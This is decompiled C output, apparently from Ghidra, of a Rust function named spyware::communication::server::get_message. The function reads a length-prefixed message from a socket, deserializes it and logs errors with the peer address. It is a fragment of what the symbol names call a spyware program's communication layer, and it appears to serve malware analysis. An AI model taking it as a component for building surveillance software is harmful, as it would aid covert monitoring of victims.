void _ZN7spyware13communication6server11get_message17hbc00a55f19d841bbE
               (undefined8 *param_1,undefined8 param_2)

{
  long lVar1;
  undefined8 uVar2;
  undefined4 local_114;
  undefined8 local_110;
  long local_108;
  undefined8 local_100;
  long local_f8;
  undefined8 local_f0;
  undefined8 uStack_e8;
  undefined8 local_e0;
  short local_d8;
  undefined4 local_d6;
  undefined2 local_d2;
  long local_d0;
  undefined4 local_c8;
  undefined4 uStack_c4;
  undefined4 uStack_c0;
  undefined4 uStack_bc;
  short *local_b8;
  undefined *local_b0;
  long *local_a8;
  undefined *local_a0;
  undefined **local_98;
  undefined8 local_90;
  undefined2 **local_88;
  undefined8 local_80;
  undefined8 local_78;
  undefined4 local_58;
  undefined4 uStack_54;
  undefined4 uStack_50;
  undefined4 uStack_4c;
  undefined4 local_48;
  undefined4 uStack_44;
  undefined4 uStack_40;
  undefined4 uStack_3c;
  undefined4 local_38;
  undefined4 uStack_34;
  undefined4 uStack_30;
  undefined4 uStack_2c;
  undefined4 local_28;
  undefined4 uStack_24;
  undefined4 uStack_20;
  undefined4 uStack_1c;
  undefined4 local_18;
  undefined4 uStack_14;
  undefined4 uStack_10;
  undefined4 uStack_c;
  
  local_114 = 0;
  local_110 = param_2;
  local_108 = _ZN3std2io18default_read_exact17h211f5ece7b69528cE(&local_110,&local_114,4);
  if (local_108 == 0) {
    uVar2 = _ZN7spyware13communication13serialization27extract_msg_type_and_length17h40fb0f3bb65520f5E
                      (local_114);
    _ZN63__LT_u8_u20_as_u20_alloc__vec__spec_from_elem__SpecFromElem_GT_9from_elem17h7bf4e21cb06e4eacE
              (&local_100,uVar2);
                    /* try { // try from 0014cb3d to 0014cb7a has its CatchHandler @ 0014cd0f */
    uVar2 = _ZN3std2io18default_read_exact17h211f5ece7b69528cE(&local_110,local_f8,local_f0);
    _ZN4core6result19Result_LT_T_C_E_GT_6expect17h34ced1219d91af61E(uVar2);
    _ZN3ron2de10from_bytes17ha5c92b24cfa261b6E(&local_98,local_f8,local_f0);
    _ZN4core6result19Result_LT_T_C_E_GT_6unwrap17h4c1d4d68a5062f9aE(&local_58,&local_98);
    *(undefined4 *)(param_1 + 6) = local_28;
    *(undefined4 *)((long)param_1 + 0x34) = uStack_24;
    *(undefined4 *)(param_1 + 7) = uStack_20;
    *(undefined4 *)((long)param_1 + 0x3c) = uStack_1c;
    *(undefined4 *)(param_1 + 4) = local_38;
    *(undefined4 *)((long)param_1 + 0x24) = uStack_34;
    *(undefined4 *)(param_1 + 5) = uStack_30;
    *(undefined4 *)((long)param_1 + 0x2c) = uStack_2c;
    *(undefined4 *)(param_1 + 2) = local_48;
    *(undefined4 *)((long)param_1 + 0x14) = uStack_44;
    *(undefined4 *)(param_1 + 3) = uStack_40;
    *(undefined4 *)((long)param_1 + 0x1c) = uStack_3c;
    *(undefined4 *)param_1 = local_58;
    *(undefined4 *)((long)param_1 + 4) = uStack_54;
    *(undefined4 *)(param_1 + 1) = uStack_50;
    *(undefined4 *)((long)param_1 + 0xc) = uStack_4c;
    _ZN4core3ptr46drop_in_place_LT_alloc__vec__Vec_LT_u8_GT__GT_17h5aa1feab37440eedE(&local_100);
    return;
  }
  lVar1 = _ZN4core4sync6atomic11atomic_load17h8c88032dab18ab12E();
  if (lVar1 != 0) {
                    /* try { // try from 0014caf9 to 0014cb03 has its CatchHandler @ 0014cd00 */
    (*(code *)PTR__ZN3std3net3tcp9TcpStream9peer_addr17h9ccf6949693ba95cE_001be628)
              (&local_100,local_110);
    lVar1 = local_f8;
    if ((short)local_100 == 2) goto LAB_0014ccbd;
    local_d2 = local_100._6_2_;
    local_d6 = local_100._2_4_;
    local_18 = (undefined4)local_f0;
    uStack_14 = local_f0._4_4_;
    uStack_10 = (undefined4)uStack_e8;
    uStack_c = uStack_e8._4_4_;
    local_d8 = (short)local_100;
    local_d0 = local_f8;
    local_c8 = (undefined4)local_f0;
    uStack_c4 = local_f0._4_4_;
    uStack_c0 = (undefined4)uStack_e8;
    uStack_bc = uStack_e8._4_4_;
    local_b8 = &local_d8;
    local_b0 = 
    PTR__ZN73__LT_core__net__socket_addr__SocketAddr_u20_as_u20_core__fmt__Display_GT_3fmt17hb8f0b665671134daE_001be630
    ;
    local_a8 = &local_108;
    local_a0 = 
    PTR__ZN60__LT_std__io__error__Error_u20_as_u20_core__fmt__Display_GT_3fmt17hcf0c0103019d8a0aE_001be638
    ;
    local_98 = &PTR_DAT_001b8bb0;
    local_90 = 2;
    local_78 = 0;
    local_88 = &local_b8;
    local_80 = 2;
                    /* try { // try from 0014cc5c to 0014ccb7 has its CatchHandler @ 0014cd00 */
    local_e0 = (*(code *)PTR__ZN3log13__private_api3loc17he75f2f86c1ff97b9E_001be620)
                         (&PTR_DAT_001b8c18);
    local_100 = &DAT_001120dc;
    local_f8 = 0x1e;
    local_f0 = &DAT_001120dc;
    uStack_e8 = 0x1e;
    _ZN3log13__private_api3log17h13afddf373bd7d7fE(&local_98,1,&local_100);
  }
  lVar1 = (*(code *)
            PTR__ZN3std2os4unix3net8datagram12UnixDatagram8shutdown17hf5fa32ea0651f745E_001be640)
                    (local_110,2);
  if (lVar1 == 0) {
    param_1[1] = local_108;
    *param_1 = 0x800000000000000a;
    return;
  }
LAB_0014ccbd:
  param_1[1] = lVar1;
  *param_1 = 0x800000000000000a;
  _ZN4core3ptr42drop_in_place_LT_std__io__error__Error_GT_17h2ffe2f512d0f1687E(&local_108);
  return;
}